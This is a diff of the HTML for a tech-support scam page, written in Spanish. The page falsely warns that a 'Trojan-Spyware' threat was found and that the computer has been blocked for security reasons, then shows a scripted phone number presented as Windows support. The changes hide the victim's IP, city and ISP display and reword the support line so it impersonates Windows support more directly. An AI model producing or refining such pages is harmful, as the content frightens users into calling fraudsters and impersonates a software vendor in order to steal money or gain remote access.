@@ -612,18 +612,19 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     <div id="txtintro">
                 <span class="colo-rd">App: Ads.financetrack(2).dll<br>
                 Threat-Detected:  Trojan-Spyware</span>
-                <span class="colo-rd">
+               <!-- <span class="colo-rd">
                     <div id="ip_add"></script></div>
                     <div id="city"></script></div>
                     <div id="isp"></script></div>
                   </span>
+	    	-->
     </div>
 
     <div id="disclaimer">
         El acceso a este ordenador ha sido bloqueado por razones de seguridad.<br>
         
 
-        <span class="support" style="font-size:22px;">Póngase en contacto con el soporte técnico:&nbsp; 
+        <span class="support" style="font-size:22px;">Póngase en contacto para soporte de Windows:&nbsp; 
         <!--<img src="phone1.png"style="width: 200px;" id="banner">-->
 	<br />
         <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script></span>
